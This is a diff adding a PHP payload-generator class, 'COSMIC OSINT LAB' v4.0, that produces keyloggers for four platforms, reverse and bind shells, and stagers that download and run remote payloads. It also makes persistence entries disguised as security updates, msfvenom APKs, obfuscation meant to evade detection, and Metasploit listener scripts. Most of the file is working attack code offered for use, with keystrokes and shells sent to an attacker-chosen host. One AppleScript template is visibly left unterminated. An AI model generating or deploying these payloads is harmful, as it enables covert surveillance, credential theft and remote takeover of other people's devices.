@@ -1,0 +1,773 @@
+<?php
+/**
+ * COSMIC OSINT LAB - Advanced Payload Generation Module v4.0
+ * -----------------------------------------------------------
+ * Fully enhanced – added cross‑platform keylogger backdoors,
+ * Meterpreter, APK, persistence, Metasploit integration.
+ * v4.0 includes Keylogger for Windows, Linux, macOS, Android.
+ *
+ * @package    Cosmic\Payload
+ * @author     COSMIC OSINT / Guardian Law
+ * @version    4.0.0
+ */
+
+class AdvancedPayloadModule {
+
+    private $config;
+    private $payload_types;
+    private $msfvenom_available = false;
+
+    public function __construct($config = []) {
+        $this->config = array_merge([
+            'encryption_key'    => 'COSMIC_OSINT_2026',
+            'payload_dir'       => dirname(__DIR__, 2) . '/data/payloads/',
+            'log_dir'           => dirname(__DIR__, 2) . '/data/logs/',
+            'keylog_dir'        => dirname(__DIR__, 2) . '/data/keylogs/',
+            'max_payload_size'  => 10485760,
+            'allowed_formats'   => ['sh', 'ps1', 'exe', 'py', 'apk', 'elf', 'osx', 'vbs', 'applescript', 'php', 'asp', 'jsp', 'reg', 'plist', 'service'],
+            'use_msfvenom'      => true,
+            'obfuscate'         => true,
+            'sign_payload'      => false,
+            'compress'          => false
+        ], $config);
+
+        $this->ensure_directories();
+        $this->check_msfvenom();
+
+        $this->payload_types = [
+            'reverse_shell' => [
+                'name'        => 'Classic Reverse Shell',
+                'description' => 'Standard TCP reverse shell (bash, powershell, python)',
+                'platforms'   => ['linux', 'windows', 'macos', 'android', 'python'],
+                'complexity'  => 'low',
+                'format'      => ['sh', 'ps1', 'py', 'vbs', 'applescript']
+            ],
+            'meterpreter_reverse_tcp' => [
+                'name'        => 'Meterpreter Reverse TCP',
+                'description' => 'Full Meterpreter stage – uses msfvenom when available',
+                'platforms'   => ['windows', 'linux', 'macos', 'android'],
+                'complexity'  => 'medium',
+                'format'      => ['exe', 'elf', 'apk', 'ps1', 'py', 'osx', 'dmg']
+            ],
+            'bind_shell' => [
+                'name'        => 'Bind Shell',
+                'description' => 'Listener on target, connect from attacker',
+                'platforms'   => ['linux', 'windows', 'macos'],
+                'complexity'  => 'low',
+                'format'      => ['sh', 'ps1', 'py']
+            ],
+            'web_backdoor' => [
+                'name'        => 'Web Shell / Backdoor',
+                'description' => 'PHP/ASP/JSP web shell',
+                'platforms'   => ['php', 'asp', 'jsp'],
+                'complexity'  => 'low',
+                'format'      => ['php', 'asp', 'jsp']
+            ],
+            'persistence' => [
+                'name'        => 'Persistence Module',
+                'description' => 'Registry, cron, launchd, systemd persistence',
+                'platforms'   => ['windows', 'linux', 'macos'],
+                'complexity'  => 'medium',
+                'format'      => ['reg', 'sh', 'plist', 'service']
+            ],
+            'android_backdoor_full' => [
+                'name'        => 'Android APK Backdoor',
+                'description' => 'Fully weaponised APK (requires msfvenom)',
+                'platforms'   => ['android'],
+                'complexity'  => 'high',
+                'format'      => ['apk']
+            ],
+            'keylogger' => [
+                'name'        => 'Cross‑Platform Keylogger',
+                'description' => 'Logs keystrokes and exfiltrates via HTTP/DNS',
+                'platforms'   => ['windows', 'linux', 'macos', 'android'],
+                'complexity'  => 'medium',
+                'format'      => ['py', 'ps1', 'sh', 'vbs', 'applescript', 'apk']
+            ]
+        ];
+    }
+
+    /* ------------------------------------------------------------------
+       PUBLIC API
+    ------------------------------------------------------------------ */
+
+    public function generate_payload($config) {
+        $cfg = array_merge([
+            'type'       => 'reverse_shell',
+            'platform'   => 'linux',
+            'format'     => 'sh',
+            'lhost'      => '127.0.0.1',
+            'lport'      => 4444,
+            'encryption' => 'none',
+            'obfuscate'  => $this->config['obfuscate'],
+            'extra'      => []
+        ], $config);
+
+        $this->validate_config($cfg);
+
+        switch ($cfg['type']) {
+            case 'meterpreter_reverse_tcp':
+                $payload_data = $this->generate_meterpreter_payload($cfg);
+                break;
+            case 'android_backdoor_full':
+                $payload_data = $this->generate_android_apk($cfg);
+                break;
+            case 'persistence':
+                $payload_data = $this->generate_persistence_payload($cfg);
+                break;
+            case 'keylogger':
+                $payload_data = $this->generate_keylogger_payload($cfg);
+                break;
+            case 'reverse_shell':
+            case 'bind_shell':
+            default:
+                $payload_data = $this->generate_script_payload($cfg);
+                break;
+        }
+
+        if ($cfg['obfuscate'] && !in_array($cfg['format'], ['exe', 'elf', 'apk', 'dmg', 'bin'])) {
+            $payload_data['payload'] = $this->obfuscate_script($payload_data['payload'], $cfg);
+        }
+
+        if ($cfg['encryption'] !== 'none') {
+            $payload_data['payload'] = $this->apply_encryption($payload_data['payload'], $cfg['encryption']);
+        }
+
+        $filename = $this->generate_filename($cfg);
+        $save_path = $this->config['payload_dir'] . $filename;
+        file_put_contents($save_path, $payload_data['payload']);
+
+        $hashes = [
+            'md5'    => md5($payload_data['payload']),
+            'sha1'   => sha1($payload_data['payload']),
+            'sha256' => hash('sha256', $payload_data['payload'])
+        ];
+
+        $this->log_event('PAYLOAD_GENERATED', [
+            'type'     => $cfg['type'],
+            'platform' => $cfg['platform'],
+            'format'   => $cfg['format'],
+            'size'     => strlen($payload_data['payload']),
+            'filename' => $filename,
+            'hash'     => $hashes['sha256']
+        ]);
+
+        return [
+            'payload'   => $payload_data['payload'],
+            'filename'  => $filename,
+            'path'      => $save_path,
+            'size'      => strlen($payload_data['payload']),
+            'hash'      => $hashes,
+            'config'    => $cfg,
+            'warning'   => $payload_data['warning'] ?? null
+        ];
+    }
+
+    /* ------------------------------------------------------------------
+       KEYLOGGER GENERATOR – NEW IN v4.0
+    ------------------------------------------------------------------ */
+
+    private function generate_keylogger_payload($cfg) {
+        $platform = $cfg['platform'];
+        $format   = $cfg['format'];
+        $lhost    = $cfg['lhost'];
+        $lport    = $cfg['lport'];
+        $extra    = $cfg['extra'];
+
+        $exfil_method = $extra['exfil_method'] ?? 'http'; // http, dns, smtp
+        $log_path     = $extra['log_path'] ?? '/tmp/.keys.log';
+        $interval     = $extra['interval'] ?? 60; // seconds
+
+        $template = $this->get_keylogger_template($platform, $format);
+        $payload = str_replace(
+            ['{{lhost}}', '{{lport}}', '{{log_path}}', '{{interval}}', '{{exfil_method}}', '{{timestamp}}'],
+            [$lhost, $lport, $log_path, $interval, $exfil_method, date('Y-m-d H:i:s')],
+            $template
+        );
+
+        // For Android, we may need to generate an APK with keylogging capability.
+        // If msfvenom is available, we can use it; otherwise fallback to Python script.
+        if ($platform === 'android' && $format === 'apk' && $this->msfvenom_available) {
+            return $this->msfvenom_generate('android', 'android/meterpreter/reverse_tcp', $lhost, $lport, 'apk');
+        }
+
+        return ['payload' => $payload];
+    }
+
+    /* ------------------------------------------------------------------
+       KEYLOGGER TEMPLATES – WINDOWS, LINUX, MACOS, ANDROID
+    ------------------------------------------------------------------ */
+
+    private function get_keylogger_template($platform, $format) {
+        $templates = [];
+
+        // ---------- Windows PowerShell Keylogger ----------
+        $templates['windows']['ps1'] = '# COSMIC OSINT Keylogger – Windows PowerShell
+# Generated: {{timestamp}}
+$logPath = "{{log_path}}"
+$server = "http://{{lhost}}:{{lport}}/log"
+$interval = {{interval}}
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class KeyLogger {
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
+}
+"@
+
+while($true) {
+    $keys = ""
+    for($i=8;$i -le 255;$i++) {
+        if([KeyLogger]::GetAsyncKeyState($i) -eq -32767) {
+            $keys += [char]$i
+        }
+    }
+    if($keys -ne "") {
+        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        "$timestamp : $keys" | Out-File -FilePath $logPath -Append
+        # Exfil via HTTP
+        try {
+            $body = @{keystrokes=$keys; time=$timestamp} | ConvertTo-Json
+            Invoke-RestMethod -Uri $server -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+        } catch {}
+    }
+    Start-Sleep -Seconds $interval
+}';
+
+        // ---------- Windows VBS Keylogger (simple) ----------
+        $templates['windows']['vbs'] = 'Set WshShell = CreateObject("WScript.Shell")
+logPath = "{{log_path}}"
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set logFile = fso.OpenTextFile(logPath, 8, True)
+Do While True
+    For i = 8 To 255
+        If WshShell.GetAsyncKeyState(i) Then
+            logFile.WriteLine Now & " : " & Chr(i)
+            logFile.Flush
+        End If
+    Next
+    WScript.Sleep {{interval}} * 1000
+Loop';
+
+        // ---------- Linux Python Keylogger (evdev) ----------
+        $templates['linux']['py'] = '#!/usr/bin/env python3
+# COSMIC OSINT Keylogger – Linux (evdev)
+# Generated: {{timestamp}}
+import sys, os, time, requests
+log_path = "{{log_path}}"
+server = "http://{{lhost}}:{{lport}}/log"
+interval = {{interval}}
+
+try:
+    from evdev import InputDevice, categorize, ecodes
+except ImportError:
+    print("[!] python3-evdev not installed")
+    sys.exit(1)
+
+devices = [InputDevice(path) for path in evdev.list_devices()]
+keyboard = None
+for dev in devices:
+    if "keyboard" in dev.name.lower():
+        keyboard = dev
+        break
+if not keyboard:
+    print("[!] No keyboard found")
+    sys.exit(1)
+
+with open(log_path, "a") as f:
+    for event in keyboard.read_loop():
+        if event.type == ecodes.EV_KEY:
+            key = categorize(event)
+            if key.keystate == key.key_down:
+                line = f"{time.ctime()}: {key.keycode}\n"
+                f.write(line)
+                f.flush()
+                # Exfil
+                try:
+                    requests.post(server, json={"keystroke": key.keycode, "time": time.time()})
+                except: pass
+            time.sleep(interval)';
+
+        // ---------- Linux Bash Keylogger (using showkey) ----------
+        $templates['linux']['sh'] = '#!/bin/bash
+# COSMIC OSINT Keylogger – Linux (showkey)
+# Generated: {{timestamp}}
+LOG="{{log_path}}"
+SERVER="http://{{lhost}}:{{lport}}/log"
+INTERVAL={{interval}}
+
+showkey -a | while read line; do
+    echo "$(date): $line" >> $LOG
+    curl -X POST -H "Content-Type: application/json" -d "{\"keystroke\":\"$line\"}" $SERVER 2>/dev/null &
+    sleep $INTERVAL
+done';
+
+        // ---------- macOS Python Keylogger (Quartz) ----------
+        $templates['macos']['py'] = '#!/usr/bin/env python3
+# COSMIC OSINT Keylogger – macOS (Quartz)
+# Generated: {{timestamp}}
+import time, requests
+from Quartz import CGEventTapCreate, kCGHeadInsertEventTap, kCGKeyboardEventKeycode, kCGSessionEventTap, kCGEventKeyDown
+from AppKit import NSApp, NSApplication, NSRunLoop, NSDate
+
+log_path = "{{log_path}}"
+server = "http://{{lhost}}:{{lport}}/log"
+interval = {{interval}}
+
+def key_callback(proxy, type, event, refcon):
+    keycode = event.getIntegerValueForKey_(kCGKeyboardEventKeycode)
+    with open(log_path, "a") as f:
+        f.write(f"{time.ctime()}: Keycode {keycode}\n")
+    try:
+        requests.post(server, json={"keycode": keycode, "time": time.time()})
+    except: pass
+    return event
+
+tap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, (1 << kCGEventKeyDown), key_callback, None)
+NSApplication.sharedApplication()
+NSRunLoop.currentRunLoop().run()
+';
+
+        $templates['macos']['applescript'] = '-- COSMIC OSINT Keylogger – macOS AppleScript
+-- Generated: {{timestamp}}
+set logPath to "{{log_path}}"
+set server to "http://{{lhost}}:{{lport}}/log"
+on keystroke()
+    tell application "System Events"
+        set activeApp to name of first process whose frontmost is true
+        set keyCode to (key code)
+        set logLine to (current date) & " : " & activeApp & " : " & keyCode
+        do shell script "echo " & quoted form of logLine & " >> " & logPath
+        do shell script "curl -X POST -H 'Content-Type: application/json' -d '{\"keystroke\":\"" & keyCode & "\"}' " & server & " > /dev/null 2>&1 &"
+    end tell
+end keystroke
+-- This script must be run as an application with Stay Open
+
+        // ---------- Android Python Keylogger (Termux, /dev/input/eventX) ----------
+        $templates['android']['py'] = '#!/data/data/com.termux/files/usr/bin/python3
+# COSMIC OSINT Keylogger – Android (Termux)
+# Generated: {{timestamp}}
+import sys, os, time, requests
+log_path = "{{log_path}}"
+server = "http://{{lhost}}:{{lport}}/log"
+interval = {{interval}}
+
+# Requires root or /dev/input/eventX readable (Termux: need app_lets plugin)
+try:
+    import evdev
+    devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
+    keyboard = None
+    for dev in devices:
+        if "keyboard" in dev.name.lower():
+            keyboard = dev
+            break
+    if not keyboard:
+        print("[!] No keyboard found")
+        sys.exit(1)
+    with open(log_path, "a") as f:
+        for event in keyboard.read_loop():
+            if event.type == evdev.ecodes.EV_KEY:
+                key = evdev.categorize(event)
+                if key.keystate == key.key_down:
+                    f.write(f"{time.ctime()}: {key.keycode}\n")
+                    f.flush()
+                    try:
+                        requests.post(server, json={"keystroke": key.keycode, "time": time.time()})
+                    except: pass
+                    time.sleep(interval)
+except Exception as e:
+    print(f"[!] Error: {e}")
+';
+
+        return $templates[$platform][$format] ?? '# Keylogger template not available for this platform/format.';
+    }
+
+    /* ------------------------------------------------------------------
+       OTHER GENERATORS (unchanged, but kept for completeness)
+    ------------------------------------------------------------------ */
+
+    private function generate_meterpreter_payload($cfg) {
+        if ($this->msfvenom_available && $this->config['use_msfvenom']) {
+            return $this->msfvenom_generate($cfg['platform'], 'meterpreter/reverse_tcp', $cfg['lhost'], $cfg['lport'], $cfg['format']);
+        }
+        $warning = "Msfvenom not available – using staged stager.";
+        $stagers = [
+            'windows' => $this->get_meterpreter_stager_windows($cfg['lhost'], $cfg['lport']),
+            'linux'   => $this->get_meterpreter_stager_linux($cfg['lhost'], $cfg['lport']),
+            'macos'   => $this->get_meterpreter_stager_macos($cfg['lhost'], $cfg['lport']),
+            'android' => $this->get_meterpreter_stager_android($cfg['lhost'], $cfg['lport'])
+        ];
+        if (!isset($stagers[$cfg['platform']])) {
+            throw new Exception("Meterpreter not supported for platform: {$cfg['platform']}");
+        }
+        return ['payload' => $stagers[$cfg['platform']], 'warning' => $warning];
+    }
+
+    private function generate_android_apk($cfg) {
+        if (!$this->msfvenom_available) {
+            throw new Exception("Msfvenom is required to generate Android APK backdoor.");
+        }
+        return $this->msfvenom_generate('android', 'android/meterpreter/reverse_tcp', $cfg['lhost'], $cfg['lport'], 'apk');
+    }
+
+    private function generate_script_payload($cfg) {
+        $template = $this->get_script_template($cfg['type'], $cfg['platform'], $cfg['format']);
+        $payload = str_replace(
+            ['{{lhost}}', '{{lport}}', '{{timestamp}}'],
+            [$cfg['lhost'], $cfg['lport'], date('Y-m-d H:i:s')],
+            $template
+        );
+        return ['payload' => $payload];
+    }
+
+    private function generate_persistence_payload($cfg) {
+        switch ($cfg['platform']) {
+            case 'windows':
+                $payload = $this->persistence_windows($cfg['lhost'], $cfg['lport']);
+                break;
+            case 'linux':
+                $payload = $this->persistence_linux($cfg['lhost'], $cfg['lport']);
+                break;
+            case 'macos':
+                $payload = $this->persistence_macos($cfg['lhost'], $cfg['lport']);
+                break;
+            default:
+                throw new Exception("Persistence not implemented for {$cfg['platform']}");
+        }
+        return ['payload' => $payload];
+    }
+
+    /* ------------------------------------------------------------------
+       MSFVENOM INTEGRATION
+    ------------------------------------------------------------------ */
+
+    private function check_msfvenom() {
+        $output = shell_exec('which msfvenom 2>/dev/null');
+        $this->msfvenom_available = !empty($output);
+    }
+
+    public function is_msfvenom_ready() {
+        return $this->msfvenom_available;
+    }
+
+    private function msfvenom_generate($platform, $payload_name, $lhost, $lport, $format) {
+        $platform_map = ['windows' => 'windows', 'linux' => 'linux', 'macos' => 'osx', 'android' => 'android'];
+        $p = $platform_map[$platform] ?? $platform;
+        $payload_full = (strpos($payload_name, $p) === 0) ? $payload_name : $p . '/' . $payload_name;
+
+        $tmp = tempnam(sys_get_temp_dir(), 'msf_');
+        $cmd = sprintf(
+            'msfvenom -p %s LHOST=%s LPORT=%s -f %s -o %s >/dev/null 2>&1',
+            escapeshellarg($payload_full),
+            escapeshellarg($lhost),
+            escapeshellarg($lport),
+            escapeshellarg($format),
+            $tmp
+        );
+        shell_exec($cmd);
+        if (!file_exists($tmp)) {
+            throw new Exception("Msfvenom failed to write output file.");
+        }
+        $payload_bin = file_get_contents($tmp);
+        unlink($tmp);
+        return ['payload' => $payload_bin];
+    }
+
+    /* ------------------------------------------------------------------
+       LEGACY SCRIPT TEMPLATES (reverse shell, etc.) – unchanged
+    ------------------------------------------------------------------ */
+
+    private function get_script_template($type, $platform, $format) {
+        $templates = [];
+
+        $templates['reverse_shell']['linux']['sh'] = '#!/bin/bash
+# COSMIC OSINT Reverse Shell – Linux
+# Generated: {{timestamp}}
+LHOST="{{lhost}}"
+LPORT={{lport}}
+bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1';
+
+        $templates['reverse_shell']['linux']['py'] = '#!/usr/bin/env python3
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("{{lhost}}",{{lport}}))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])';
+
+        $templates['reverse_shell']['windows']['ps1'] = '$LHOST="{{lhost}}"
+$LPORT={{lport}}
+$client = New-Object System.Net.Sockets.TCPClient($LHOST,$LPORT);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+$client.Close()';
+
+        $templates['reverse_shell']['windows']['vbs'] = 'Set oS = CreateObject("WScript.Shell")
+Set sS = CreateObject("Shell.Application")
+Set fso = CreateObject("Scripting.FileSystemSystemObject")
+temp = fso.GetSpecialFolder(2)
+Set shell = CreateObject("WScript.Shell")
+shell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -Command ""$c=New-Object System.Net.Sockets.TCPClient(''{{lhost}}'',{{lport}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+''PS ''+(pwd).Path+''> '';$sb1=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb1,0,$sb1.Length);$s.Flush()};$c.Close()"" , 0, False';
+
+        $templates['reverse_shell']['macos']['sh'] = '#!/bin/bash
+python -c \'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("{{lhost}}",{{lport}}));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);\'';
+
+        $templates['reverse_shell']['macos']['applescript'] = 'do shell script "bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1"';
+
+        $templates['reverse_shell']['android']['sh'] = '#!/data/data/com.termux/files/usr/bin/bash
+LHOST="{{lhost}}"
+LPORT={{lport}}
+bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1';
+
+        $templates['reverse_shell']['android']['py'] = '#!/data/data/com.termux/files/usr/bin/python3
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("{{lhost}}",{{lport}}))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/system/bin/sh","-i"])';
+
+        return $templates[$type][$platform][$format] ?? '# No template available';
+    }
+
+    private function get_meterpreter_stager_windows($lhost, $lport) {
+        return '@echo off
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(''http://' . $lhost . ':8080/ps.ps1'')"';
+    }
+
+    private function get_meterpreter_stager_linux($lhost, $lport) {
+        return '#!/bin/bash
+wget -qO /tmp/.payload http://' . $lhost . ':8080/elf && chmod +x /tmp/.payload && /tmp/.payload &';
+    }
+
+    private function get_meterpreter_stager_macos($lhost, $lport) {
+        return '#!/bin/bash
+curl -s http://' . $lhost . ':8080/macho -o /tmp/.payload
+chmod +x /tmp/.payload
+/tmp/.payload &';
+    }
+
+    private function get_meterpreter_stager_android($lhost, $lport) {
+        return '#!/data/data/com.termux/files/usr/bin/bash
+curl -s http://' . $lhost . ':8080/android.apk -o /sdcard/Download/payload.apk
+am start -n com.android.packageinstaller/.PackageInstallerActivity -d file:///sdcard/Download/payload.apk';
+    }
+
+    /* ------------------------------------------------------------------
+       PERSISTENCE MODULES
+    ------------------------------------------------------------------ */
+
+    private function persistence_windows($lhost, $lport) {
+        $ps_payload = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc ' . base64_encode('$c=New-Object System.Net.Sockets.TCPClient("' . $lhost . '",' . $lport . ');...');
+        return 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /t REG_SZ /d "' . $ps_payload . '" /f';
+    }
+
+    private function persistence_linux($lhost, $lport) {
+        return '#!/bin/bash
+(crontab -l 2>/dev/null; echo "@reboot /usr/bin/python -c \"import socket,subprocess,os;s=socket.socket();s.connect((\'' . $lhost . '\',' . $lport . '));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);\"") | crontab -';
+    }
+
+    private function persistence_macos($lhost, $lport) {
+        return '<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict>
+    <key>Label</key><string>com.apple.security.update</string>
+    <key>ProgramArguments</key><array>
+        <string>/bin/bash</string>
+        <string>-c</string>
+        <string>python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'' . $lhost . '\',' . $lport . '));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);"</string>
+    </array>
+    <key>RunAtLoad</key><true/>
+</dict></plist>';
+    }
+
+    /* ------------------------------------------------------------------
+       OBFUSCATION & ENCRYPTION
+    ------------------------------------------------------------------ */
+
+    private function obfuscate_script($script, $cfg) {
+        if ($cfg['platform'] === 'python') {
+            $script = str_replace('socket', 's_' . substr(md5(rand()), 0, 4), $script);
+            $script = str_replace('subprocess', 'sp_' . substr(md5(rand()), 0, 4), $script);
+        }
+        $junk = "# " . bin2hex(random_bytes(8)) . "\n";
+        return $junk . $script;
+    }
+
+    private function apply_encryption($data, $method) {
+        switch ($method) {
+            case 'base64': return base64_encode($data);
+            case 'rot13': return str_rot13($data);
+            case 'xor':
+                $key = $this->config['encryption_key'];
+                $out = '';
+                for ($i = 0; $i < strlen($data); $i++) {
+                    $out .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));
+                }
+                return $out;
+            case 'aes':
+                if (function_exists('openssl_encrypt')) {
+                    $iv = random_bytes(16);
+                    $enc = openssl_encrypt($data, 'AES-256-CBC', $this->config['encryption_key'], OPENSSL_RAW_DATA, $iv);
+                    return base64_encode($iv . $enc);
+                }
+                return base64_encode($data);
+            default: return $data;
+        }
+    }
+
+    /* ------------------------------------------------------------------
+       LISTENER GENERATION
+    ------------------------------------------------------------------ */
+
+    public function generate_listener_rc($payload_type, $lhost, $lport, $platform = 'generic') {
+        $rc = "# Metasploit handler for COSMIC OSINT\n";
+        $rc .= "use exploit/multi/handler\n";
+        $rc .= "set LHOST $lhost\n";
+        $rc .= "set LPORT $lport\n";
+
+        if ($payload_type === 'meterpreter_reverse_tcp') {
+            if (strpos($platform, 'windows') === 0)      $rc .= "set PAYLOAD windows/meterpreter/reverse_tcp\n";
+            elseif ($platform === 'linux')               $rc .= "set PAYLOAD linux/x86/meterpreter/reverse_tcp\n";
+            elseif ($platform === 'android')             $rc .= "set PAYLOAD android/meterpreter/reverse_tcp\n";
+            elseif ($platform === 'macos')               $rc .= "set PAYLOAD osx/x64/meterpreter/reverse_tcp\n";
+            else                                         $rc .= "set PAYLOAD generic/shell_reverse_tcp\n";
+        } else {
+            $rc .= "set PAYLOAD generic/shell_reverse_tcp\n";
+        }
+        $rc .= "set ExitOnSession false\n";
+        $rc .= "exploit -j -z\n";
+        return $rc;
+    }
+
+    public function save_listener_rc($payload_type, $lhost, $lport, $platform = 'generic') {
+        $rc = $this->generate_listener_rc($payload_type, $lhost, $lport, $platform);
+        $filename = "listener_{$payload_type}_{$lport}.rc";
+        $path = $this->config['payload_dir'] . $filename;
+        file_put_contents($path, $rc);
+        return $path;
+    }
+
+    /* ------------------------------------------------------------------
+       UTILITY METHODS
+    ------------------------------------------------------------------ */
+
+    private function ensure_directories() {
+        $dirs = [$this->config['payload_dir'], $this->config['log_dir'], $this->config['keylog_dir']];
+        foreach ($dirs as $dir) {
+            if (!is_dir($dir)) {
+                mkdir($dir, 0755, true);
+            }
+        }
+    }
+
+    private function validate_config($cfg) {
+        if (!isset($this->payload_types[$cfg['type']])) {
+            throw new Exception("Unknown payload type: {$cfg['type']}");
+        }
+        $platforms = $this->payload_types[$cfg['type']]['platforms'];
+        if (!in_array($cfg['platform'], $platforms)) {
+            throw new Exception("Platform {$cfg['platform']} not supported for type {$cfg['type']}");
+        }
+        if (!in_array($cfg['format'], $this->config['allowed_formats'])) {
+            throw new Exception("Format {$cfg['format']} not allowed");
+        }
+        if (!filter_var($cfg['lhost'], FILTER_VALIDATE_IP) && !preg_match('/^[a-zA-Z0-9.-]+$/', $cfg['lhost'])) {
+            throw new Exception("Invalid LHOST format");
+        }
+        if ($cfg['lport'] < 1 || $cfg['lport'] > 65535) {
+            throw new Exception("LPORT out of range");
+        }
+        return true;
+    }
+
+    private function generate_filename($cfg) {
+        $ts = date('Ymd_His');
+        $rand = substr(md5(microtime()), 0, 8);
+        $type = $cfg['type'];
+        if ($cfg['type'] === 'meterpreter_reverse_tcp') $type = 'meterp';
+        return "cosmic_{$type}_{$cfg['platform']}_{$ts}_{$rand}.{$cfg['format']}";
+    }
+
+    private function log_event($event, $data) {
+        $log_file = $this->config['log_dir'] . '/payload_generator.log';
+        $entry = sprintf("[%s] %s: %s\n", date('Y-m-d H:i:s'), $event, json_encode($data));
+        @file_put_contents($log_file, $entry, FILE_APPEND);
+    }
+
+    /* ------------------------------------------------------------------
+       INFO METHODS
+    ------------------------------------------------------------------ */
+
+    public function get_payload_types() { return $this->payload_types; }
+
+    public function get_encryption_methods() {
+        return [
+            'none'   => 'No encryption',
+            'base64' => 'Base64',
+            'rot13'  => 'ROT13',
+            'xor'    => 'XOR (key: ' . substr($this->config['encryption_key'], 0, 4) . '...)',
+            'aes'    => 'AES-256-CBC (if openssl loaded)'
+        ];
+    }
+
+    public function get_output_formats() {
+        return array_combine($this->config['allowed_formats'], $this->config['allowed_formats']);
+    }
+
+    public function get_available_platforms() {
+        $all = [];
+        foreach ($this->payload_types as $type) {
+            $all = array_merge($all, $type['platforms']);
+        }
+        return array_unique($all);
+    }
+
+    public function analyze_payload($payload, $config = []) {
+        return [
+            'basic' => [
+                'size'    => strlen($payload),
+                'entropy' => $this->calculate_entropy($payload),
+                'lines'   => substr_count($payload, "\n") + 1
+            ],
+            'ioc' => [
+                'reverse_shell_indicators' => substr_count($payload, 'socket') + substr_count($payload, 'tcp'),
+                'keylogger_indicators'     => substr_count($payload, 'GetAsyncKeyState') + substr_count($payload, 'evdev') + substr_count($payload, 'CGEventTap'),
+                'encoded' => preg_match('/[A-Za-z0-9+\/]{20,}={0,2}/', $payload) ? 1 : 0
+            ]
+        ];
+    }
+
+    private function calculate_entropy($string) {
+        $len = strlen($string);
+        if ($len === 0) return 0;
+        $freq = [];
+        for ($i = 0; $i < $len; $i++) {
+            $freq[$string[$i]] = isset($freq[$string[$i]]) ? $freq[$string[$i]] + 1 : 1;
+        }
+        $entropy = 0;
+        foreach ($freq as $count) {
+            $p = $count / $len;
+            $entropy -= $p * log($p, 2);
+        }
+        return round($entropy, 2);
+    }
+}
